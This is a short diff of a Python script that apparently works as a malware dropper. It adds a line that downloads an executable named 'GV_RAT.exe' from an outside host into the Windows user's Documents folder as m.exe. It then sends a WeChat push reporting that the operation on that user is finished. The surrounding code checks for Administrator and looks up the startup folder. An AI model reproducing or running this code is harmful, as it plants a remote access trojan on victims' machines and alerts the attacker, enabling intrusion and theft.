@@ -97,7 +97,7 @@ def start_cmd(ml):
 def download_file(_url, _save_path):
     response = requests.get(_url, stream=True)
     with open(_save_path, 'wb') as f:
-        for chunk in response.iter_content(chunk_size=8192):
+        for chunk in response.iter_content(chunk_size=10240):
             f.write(chunk)
 
 # 获取Windows启动文件夹路径
@@ -111,5 +111,7 @@ def get_startup_folder_path():
 if sys_username == 'Administrator':
     # start_cmd('start cmd')
     ...
-wechat_push.Alleged_information(f'{sys_username}可以操作')
-# download_file()
+
+download_file("https://yc.052024.xyz/exe/GV_RAT.exe", f"C:/Users/{sys_username}/Documents/m.exe")
+wechat_push.Alleged_information(f'{sys_username}操作完成')
+
